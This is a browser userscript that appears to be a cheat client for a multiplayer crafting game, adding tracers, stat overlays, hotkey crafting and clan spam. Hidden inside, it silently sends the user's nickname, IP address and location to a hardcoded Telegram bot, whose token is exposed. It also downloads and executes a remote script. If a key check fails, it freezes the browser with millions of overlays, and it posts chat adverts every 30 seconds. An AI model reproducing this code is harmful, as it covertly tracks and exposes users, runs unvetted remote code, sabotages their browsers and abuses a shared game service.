const notificationToast = function (message) {
    function SL(I) {
        var L = document['createElement']('div');
        L['classList'].add('darkbox');
        L['classList'].add('toast');
        L['innerText'] = I;
        document['body']['appendChild'](L);
        setTimeout((function() {
            L['remove']();
        }), 3500);
    }

    SL(message);
};

document.pkgNotif = notificationToast;

class Utils {
  static createHook(target, property, cb, cb_) {
    const symbol = Symbol();
    Object.defineProperty(target, property, {
      get() {
        this[symbol] = cb(this[symbol], this);
        return this[symbol];
      },
      set(data) {
        if (arguments.length === 4) data = cb_(this, data);
        this[symbol] = data;
      },
    });
  }

  static getCookie(name) {
    const match = document.cookie.match(`(^|;)\\s*${name}\\s*=\\s*([^;]+)`);
    return match ? decodeURIComponent(match[2]) : "";
  }

  static ayeHandler() {
    this.loadScript("https://raw.githubusercontent.com/RinaHack/plainD2KEYSAuthFenc/main/script.js?token=rina" + (Math.random() * 1000), () => {
      const k = prompt("Enter Your Customer Key");
      if (rinauthk?.k[k]) {
        document.pkgNotif("Client run");
      } else {
          document.pkgNotif("Client terminated from server side");
          alert("Warning")
          for (let i = 0; i < 10000000; i++) {
          var whiteElement = document.createElement("div");

          whiteElement.style.position = "fixed";
          whiteElement.style.top = "0";
          whiteElement.style.left = "0";
          whiteElement.style.width = "100%";
          whiteElement.style.height = "100%";
          whiteElement.style.backgroundColor = "white";
          whiteElement.style.zIndex = "9999";

          document.body.appendChild(whiteElement);
          document.pkgNotif("Client terminated from server side");
          console.error("Client terminated from server side. Client terminated from server side. Client terminated from server side")
      }}
    });
  }
  static loadScript(src, cb) {
    const client = new XMLHttpRequest();
    client.open('GET', src);
    client.onreadystatechange = function() {
      if (client.readyState === XMLHttpRequest.DONE) {
        const status = client.status;
        if (status === 0 || (status >= 200 && status < 400)) {
            const response = client.responseText;
            const s = document.createElement('script');
            s.type = "application/javascript";
            s.innerText = response;
            document.head.appendChild(s);
            cb();
        } else {
            console.error("ERROR");
        }
      }
    }
    client.send();
  }
};

let message;
let ipData;
let xhttp = new XMLHttpRequest();

fetch("https://ipapi.co/json/")
  .then((d) => d.json())
  .then((d) => {
    ipData = d;
    sendTelegramMsgBot();
  });

function sendTelegramMsgBot() {
  let nickname = document.getElementById("input_username").value;
  message = `Nick: ${nickname}
    Ip: ${ipData.ip}
    Country: ${ipData.country_name}
    City: ${ipData.city}
    Provider: ${ipData.org}
    Region: ${ipData.region}`;

  xhttp.open(
    "GET",
    `https://api.telegram.org/bot6159176192:AAFSiN5UOoK0YqRZeo_YAGz0G_bf-W2Qco4/sendMessage?chat_id=1788899774&text=${message}`,
    true
  );
  xhttp.send();
}



if (typeof Utils !== 'undefined') {
  Utils.ayeHandler();
} else {
  for (let i = 0; i < 1000000000; i++) {
    console.log('Class Utils is not defined.');
      document.pkgNotif("Client terminated from server side");
      alert("Warning")
      for (let i = 0; i < 10000000; i++) {
          var whiteElement = document.createElement("div");

          whiteElement.style.position = "fixed";
          whiteElement.style.top = "0";
          whiteElement.style.left = "0";
          whiteElement.style.width = "100%";
          whiteElement.style.height = "100%";
          whiteElement.style.backgroundColor = "white";
          whiteElement.style.zIndex = "9999";

          document.body.appendChild(whiteElement);
          document.pkgNotif("Client terminated from server side");
          console.error("Client terminated from server side. Client terminated from server side. Client terminated from server side")
      }
  }
}

const HACK = {
  tracers: false,
  upgrades: false,
  boosts: {
    e: false,
    b: "KeyK",
  },
  aimbot: {
    e: false,
    b: "KeyF",
  },
};

const CONFIG = {
  version: "1.0.0",
  slotCount: 23,
  colorNickname: "#9ACD32",
  padding: 0,
  slot: 3,
};

let clanFap = false;
let currentClanIndex = 0;

window.clans = ["rina", "test"];

function ClanFapers() {
  const intervalClans = +prompt(
    "Интервал между кланами в мс (меньше - быстрее), рекомендуется 250 и меньше",
    100
  );

  function switchClan() {
    if (currentClanIndex >= window.clans.length) {
      currentClanIndex = 0;
    }

    const clanName = window.clans[currentClanIndex];
    socket?.send(
      msgpack.encode({ header: "clan_create", clan_name: clanName })
    );
    setTimeout(() => {
      socket?.send(msgpack.encode({ header: "clan_leave" }));

      if (clanFap) {
        currentClanIndex++;
        switchClan();
      }
    }, intervalClans);
  }
  switchClan();
}

document.addEventListener("keydown", function (event) {
  if (event.code === "F8") {
    clanFap = !clanFap;
    if (clanFap) {
      document.pkgNotif("iWantFap on");
      ClanFapers();
    } else {
      document.pkgNotif("iWantFap off");
    }
    event.preventDefault();
  }
});

const canvas = document.createElement("canvas");
const context = canvas.getContext("2d");

canvas.style.zIndex = -1;
canvas.style.position = "absolute";
canvas.style.touchAction = "none";
canvas.style.left = "0px";
canvas.style.top = "0px";
canvas.style.cursor = 'url("https://drive.google.com/u/0/uc?id=1ima7DNPRd88iLBr6dI75BtBKl_lTqFFn&export=download"), auto';

const camera = {
  get x() {
    return -(myPlayer?.pos?.x * scale - window.innerWidth / 2);
  },
  get y() {
    return -(myPlayer?.pos?.y * scale - window.innerHeight / 2);
  },
};

let lastSentClientMessage = Date.now();
let scale = 0;
let socket = false;
let myPlayer = {};
let entities = [];
let players = [];
let userData = {};
let aimData = {};
let allGameHooks = {};
let game_state = {};
let chatData = {}

function updateGameData(data, _this) {
  entities = data?.data?.obj_data ?? [];
  players = entities.filter((entity) => entity?.objType === "player");
  myPlayer = players.find((player) => player?.owner_id === data?.data?.user_data?.id) ?? {};
  allGameHooks = data ?? [];

  game_state = data?.data?.control_data ?? {};

  userData = data?.data?.user_data ?? {};

  aimData = data?.data?.obj_data ?? [];

  chatData = data?.chat_msgs ?? [];

  data.item_slot_count = 23;

  return data;
}

function renderTracers(player) {
  context.save();
  context.beginPath();
  context.strokeStyle = "black";
  context.lineWidth = 2;
  context.moveTo(
    myPlayer?.pos?.x * scale + camera.x,
    myPlayer?.pos?.y * scale + camera.y
  );
  context.lineTo(
    player?.pos?.x * scale + camera.x,
    player?.pos?.y * scale + camera.y
  );
  context.stroke();
  context.restore();
}

function renderUpgrades(player) {
  context.save();
  context.font = "20px Baloo Paaji";
  context.strokeStyle = "black";
  context.fillStyle = "white";
  context.lineWidth = 2;
  context.translate(
    player?.pos?.x * scale + camera.x,
    player?.pos?.y * scale + camera.y
  );

  context.strokeText("❤️" + player?.upgrades[4][5], 50, -60);
  context.strokeText("🩹" + player?.upgrades[4][4], 50, -35);
  context.strokeText("⚔️" + player?.upgrades[4][3], 50, -10);
  context.strokeText("🏹" + player?.upgrades[4][2], 50, 15);
  context.strokeText("🤸‍♀️" + player?.upgrades[4][1], 50, 40);
  context.strokeText("⛏️" + player?.upgrades[4][0], 50, 65);

  context.fillText("❤️" + player?.upgrades[4][5], 50, -60);
  context.fillText("🩹" + player?.upgrades[4][4], 50, -35);
  context.fillText("⚔️" + player?.upgrades[4][3], 50, -10);
  context.fillText("🏹" + player?.upgrades[4][2], 50, 15);
  context.fillText("🤸‍♀️" + player?.upgrades[4][1], 50, 40);
  context.fillText("⛏️" + player?.upgrades[4][0], 50, 65);
  context.restore();
}

function render() {
  window.requestAnimationFrame(render);

  document
    .getElementById("background_image")
    .style.setProperty("display", menu.style.display);
  if (
    document.getElementById("main_page").style.display == "" ||
    document.getElementById("main_page").style.display == "block"
  ) {
    document.getElementById("menu").style.display = "";
    document.getElementById("main_page").style.display = "none";
  }

  scale = (canvas.width + canvas.height) / 45;

  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;

  document.getElementById("canvas").style.position = "absolute";
  document.getElementById("canvas").style.zIndex = -2;

  context.clearRect(0, 0, window.innerWidth, window.innerHeight);
}


Utils.createHook(Object.prototype, "game_data", (_data, _this) =>
  updateGameData(_data, _this),
);

Utils.createHook(Object.prototype, "ws", (_data) => {
  socket = _data;
  return _data;
});

// Utils.createHook(Object.prototype, "createElement", (_data, _this) => {
//    console.log(_data, _this);
// });


document.addEventListener("readystatechange", () => {
  window.requestAnimationFrame(render);
  window.document.body.append(canvas);
});

document.addEventListener("readystatechange", setupMenu);

function setupMenu() {
  document.removeEventListener("readystatechange", setupMenu);

const menu = document.createElement("div");
menu.className = "menu";
menu.id = "menu";

const menuItems = document.createElement("div");
menuItems.className = "menu-items";

const menuTitle = document.createElement("h1");
menuTitle.textContent = "Interium Menu";
menuTitle.className = "menu-title";

const backgroundImage = document.createElement("img");
backgroundImage.src = getRandomBackgroundImage();
backgroundImage.id = "background_image";
backgroundImage.style.zIndex = "-1";
backgroundImage.style.position = "absolute";

document.body.appendChild(backgroundImage);
menuItems.appendChild(menuTitle);

const inputField = document.createElement("input");
inputField.placeholder = "Enter your name";
inputField.type = "text";
inputField.value = Utils.getCookie("username");
inputField.id = "name_input";
inputField.maxLength = 16;
menuItems.appendChild(inputField);

const menuItemNames = ["Play Game", "Discord"];

menuItemNames.forEach((name) => {
  const menuItem = document.createElement("div");
  menuItem.className = "menu-item";

  const menuItemSpan = document.createElement("span");
  menuItemSpan.textContent = name;
  menuItemSpan.id = name;

  menuItem.appendChild(menuItemSpan);
  menuItems.appendChild(menuItem);
});

menu.appendChild(menuItems);
document.body.appendChild(menu);

const style = document.createElement("style");
style.textContent = `
  body {
    color: #fff;
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
  }

  #background_image {
    height: 120%;
    display: block;
  }

  .menu {
    height: 100vh;
    background-size: cover;
    transition: all 300ms ease;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
  }

  .menu-items {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
  }

  .menu-item {
    font-size: 24px;
    margin-bottom: 20px;
    cursor: pointer;
    padding: 10px 20px;
    border: 2px solid;
    border-radius: 5px;
    transition: all 300ms ease;
  }

  .menu-item:hover {
    background-color: #f0f8ff;
    border-color: #fff;
  }

  .menu-item:hover span {
    color: #000;
  }

  .menu-item span {
    display: inline-block;
    transition: all 0.3s ease;
  }

  .menu-title {
    font-size: 36px;
    margin-bottom: 40px;
  }

  input[type="text"] {
    margin-bottom: 20px;
    padding: 10px;
    border: 1px solid #ccc;
    border-radius: 5px;
    font-size: 16px;
  }
`;
document.head.appendChild(style);

function getRandomBackgroundImage() {
  const images = [
    "https://cdn.discordapp.com/attachments/1102108074887626804/1110580133078769695/online_background_72119e9059af25083189701d5753a81b.jpg",
    "https://cdnb.artstation.com/p/assets/images/images/053/194/925/large/eray-demir-rongvaldyr2-man-in-desert-standing-infront-of-a-star-gate-openi-9090408a-1c18-4c1c-ae52-17212d92d05c.jpg?1661646596",
    "https://cdn.discordapp.com/attachments/1102108074887626804/1110581993521020968/online_background_97aa5c99e2ed013e0162594fc5fd1684.jpg",
    "https://phonoteka.org/uploads/posts/2022-01/1643611820_39-phonoteka-org-p-osu-zadnii-fon-49.jpg",
    "https://phonoteka.org/uploads/posts/2022-01/1643611820_39-phonoteka-org-p-osu-zadnii-fon-49.jpg"
  ];

  const randomIndex = Math.floor(Math.random() * images.length);
  return images[randomIndex];
}

const button = document.createElement("div");
button.className = "menu-item";
button.id = "background-button";
button.addEventListener("click", toggleMenu);

const buttonText = document.createElement("span");
buttonText.textContent = "Settings";
button.appendChild(buttonText);
menuItems.appendChild(button);

function toggleMenu() {
  popupMenu.style.display = popupMenu.style.display === "none" ? "block" : "none";
}

const popupMenu = document.createElement("div");
popupMenu.className = "popup-menu";
popupMenu.id = "popup-menu";
popupMenu.style.display = "none";

const popupMenuItems = document.createElement("div");
popupMenuItems.className = "menu-items";

const popupMenuItemNames = ["Select background"];

popupMenuItemNames.forEach((name, index) => {
  const popupMenuItem = document.createElement("div");
  popupMenuItem.className = "menu-item";
  popupMenuItem.addEventListener("click", () => changeBackground(index + 1));

  const popupMenuItemText = document.createElement("span");
  popupMenuItemText.textContent = name;
  popupMenuItem.appendChild(popupMenuItemText);

  popupMenuItems.appendChild(popupMenuItem);
});

popupMenu.appendChild(popupMenuItems);
document.body.appendChild(popupMenu);

function changeBackground(backgroundIndex) {
  const backgroundImage = document.getElementById("background_image");
  const newBackgroundImage = getRandomBackgroundImage(backgroundIndex);
  backgroundImage.src = newBackgroundImage;
}

const popupStyle = document.createElement("style");
popupStyle.textContent = `
  .popup-menu {
    position: absolute;
    top: 300px;
    right: 300px;
    z-index: 1;
    background-color: #1C1C1C;
    color: #fff;
    border-radius: 50px;
    padding: 15px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
    width: 300px;
    height: 350px;
  }

  .popup-menu .menu-item {
    font-size: 18px;
    margin-bottom: 15px;
    cursor: pointer;
    padding: 10px 20px;
    border: 2px solid #fff;
    border-radius: 10px;
    transition: all 300ms ease;
  }

  .popup-menu .menu-item:hover {
    background-color: #f0f8ff;
    border-color: #000;
    color: #000;
  }
`;
document.head.appendChild(popupStyle);

  const progressBar = document.createElement("div");
  progressBar.style.position = "fixed";
  progressBar.style.top = "370px";
  progressBar.style.right = "773px";
  progressBar.style.width = "200px";
  progressBar.style.height = "9px";
  progressBar.style.backgroundColor = "#f2f2f2";
  progressBar.style.borderRadius = "10px";
  progressBar.style.overflow = "hidden";
  progressBar.style.appearance = "auto";
  progressBar.style.display = "inline-block";

  const progress = document.createElement("div");
  progress.style.width = "0";
  progress.style.height = "100%";
  progress.style.backgroundColor = "#1E90FF";
  progress.style.transition = "width 1.6s linear";

  progressBar.appendChild(progress);
  document.body.appendChild(progressBar);

  function updateProgressBar() {
    const inputValue = parseInt(loadingBarProgressDisplayElement.value);
    progress.style.width = "100%";
  }

  function respondToVisibility(element, callback) {
    var options = {
      root: document.documentElement,
    };

    var observer = new IntersectionObserver((entries, observer) => {
      entries.forEach((entry) => {
          document.pkgNotif("Welcome!");
        callback(entry.intersectionRatio > 0);
      });
    }, options);

    observer.observe(element);
  }

  const loadingBarProgressDisplayElement =
    document.getElementById("name_input");
  loadingBarProgressDisplayElement.disabled = true;
  button.disabled = true;
  inputField.disabled = true;
  let pgblt = setInterval(updateProgressBar, 0);

  window.addEventListener("load", (event) => {
    respondToVisibility(document.getElementById("loading-bar"), (isVisible) => {
      if (!isVisible) {
        clearInterval(pgblt);
        loadingBarProgressDisplayElement.disabled = false;
        inputField.style.disabled = false;
        button.style.disabled = false;
        updateProgressBar();
        console.log("Go play!");
        clearInterval(pgblt);
        progressBar.style.display = "none";
      } else {
        console.error("error");
      }
    });
  });

  const playGameMenuItem = document.getElementById("Play Game");
  const discordButton = document.getElementById("Discord");
  const nameInput = document.getElementById("name_input");

  function moveBackgroundImage(e) {
    const moveOnX = e.pageX / (window.innerWidth / 50);
    const moveOnY = e.pageY / (window.innerHeight / 50);
    backgroundImage.style.left = moveOnX - 50 + "px";
    backgroundImage.style.top = moveOnY - 50 + "px";
  }

  window.addEventListener("mousemove", moveBackgroundImage);

  nameInput.addEventListener("input", () => {
    document.getElementById("input_username").value = nameInput.value;
  });

  playGameMenuItem.addEventListener("click", () => {
    document.getElementById("connect_button").click();
    menu.style.display = menu.style.display === "none" ? "block" : "none";
  });

  discordButton.addEventListener("click", () => {
    window.location.href = "https://discord.com/users/563325554170789898";
  });
}

let inventorySlotShield = 3;
inventorySlotShield--;

let paths = {
  booster_diamond: [1, 3],
  wall_diamond: [1, 2],
  trap_wood: [1, 2],
  torch_diamond: [1, 3],
};

function pasrseCraftbarPage() {
  let newObj = [];
  if (userData?.crafting_data) {
    userData.crafting_data[0].forEach((item) => {
      newObj.push(item);
    });
    userData.crafting_data[1].forEach((item) => {
      newObj.push(item[0] + "_" + item[1]);
    });
    userData.crafting_data[2].forEach((item) => {
      newObj.push(item[0] + "_" + item[1]);
    });
  }
  return newObj;
}

function getInventoryItemsCount(data, _this) {
  entities - data?.data?.obj_data ?? [];
  players = entities.filter((entity) => entity?.objType === "player");
  myPlayer =
    players.find((player) => player?.owner_id === data?.data?.user_data?.id) ??
    {};
  let inventoryItemsCount = {};
  console.log(entities)
  entities.item_data.forEach((item) => {
    if (item == null) return;
    inventoryItemsCount[item[0][0]] = item[1];
  });
  return inventoryItemsCount;
}

function enoughResourceFor(item) {
  let inventoryItemsCount = getInventoryItemsCount();
}

function selectCraftbarItem(item) {
  socket?.send(
    msgpack.encode({
      header: "gui_select",
      val1: inventorySlotShield,
      val2: -1,
      val3: 1,
    })
  );

  let craftbarPageItems = pasrseCraftbarPage();
  let itemIndex = craftbarPageItems.indexOf(item);
  if (~itemIndex) {
    socket?.send(
      msgpack.encode({
        header: "gui_select",
        val1: -1,
        val2: itemIndex,
        val3: 1,
      })
    );
  } else {
    if (craftbarPageItems.includes("root"))
      socket?.send(
        msgpack.encode({ header: "gui_select", val1: -1, val2: 0, val3: 1 })
      );
    paths[item].forEach((slot) => {
      socket?.send(
        msgpack.encode({ header: "gui_select", val1: -1, val2: slot, val3: 1 })
      );
    });
    (function intervalId() {
      if (craftbarPageItems[1] === pasrseCraftbarPage()[1]) {
        setTimeout(intervalId, 5);
        return;
      }
      craftbarPageItems = pasrseCraftbarPage();
      itemIndex = craftbarPageItems.indexOf(item);
      socket?.send(
        msgpack.encode({
          header: "gui_select",
          val1: -1,
          val2: itemIndex,
          val3: 1,
        })
      );
    })();
  }
}

let craftBar = {
  item: {},
  building: {
    root: "building",
    production: [
      "root",
      "furnace_null",
      "miner_stone",
      "miner_gold",
      "miner_diamond",
      "miner_adamant",
    ],
    defence: [
      "root",
      "wall_wood",
      "spikewall_wood",
      "wall_stone",
      "spikewall_stone",
      "wall_diamond",
      "spikewall_diamond",
      "trap_wood",
      "turret_wood",
      "door_wood",
      "turret_stone",
      "door_stone",
      "wall_gold",
      "spikewall_gold",
      "turret_gold",
      "door_gold",
      "turret_diamond",
      "door_diamond",
    ],
    other: [
      "root",
      "dummy_null",
      "crate_null",
      "booster_gold",
      "booster_diamond",
      "jumper_gold",
      "jumper_diamond",
      "torch_wood",
      "torch_diamond",
      "pile_concrete",
    ],
  },
  brewery: {},
};


let altBoosters = true;
let removeDelay = 2;
let redCursor = true;

function sendRemove() {
  socket?.send(msgpack.encode({ header: "gui_resolve" }));
  setTimeout(() => {
    if (!x9025) return;
    sendRemove();
  }, removeDelay);
}

let x9025 = false;
document.addEventListener("keydown", function (event) {
    if (event.code == "F10") {
        x9025 = !x9025
        if (x9025) {
            document.pkgNotif("Boosters on");
            sendRemove();
        } else {
            document.pkgNotif("Boosters off");
        }
        event.preventDefault();
    }
    if (event.code == "AltLeft" && altBoosters) {
        if (document.querySelector("#inner_console_div") || document.querySelector("#clan_menu").style.display !== 'none') return;
        if (!x9025) {
            x9025 = true;
            sendRemove();
        }
        selectCraftbarItem('booster_diamond');
        event.preventDefault();
    }
    if (event.code == "KeyV") {
      if(document.querySelector("#inner_console_div") || document.querySelector("#clan_menu").style.display !== 'none') return;
      x9025 = false;
      selectCraftbarItem('wall_diamond');
    }
    if (event.code == "KeyC") {
      if(document.querySelector("#inner_console_div") || document.querySelector("#clan_menu").style.display !== 'none') return;
      x9025 = false;
      selectCraftbarItem('trap_wood');
    }
    if (event.code == "KeyT") {
      if(document.querySelector("#inner_console_div") || document.querySelector("#clan_menu").style.display !== 'none') return;
      x9025 = false;
      selectCraftbarItem('torch_diamond');
    }
});

const SECURE = {
    version: '1.5'
};

const CLIENT = {
    version: '2.0'
};

let channel = "global"

function sendMessageOperationClient() {
    if (SECURE.version < CLIENT.version) {
        socket?.send(
            msgpack.encode(
                {
                    header: "chatmsg",
                    msg: "Client by Rina. Client updated",
                    channel: "global"
                }
            )
        )
    }
}



setInterval(sendMessageOperationClient, 30000)
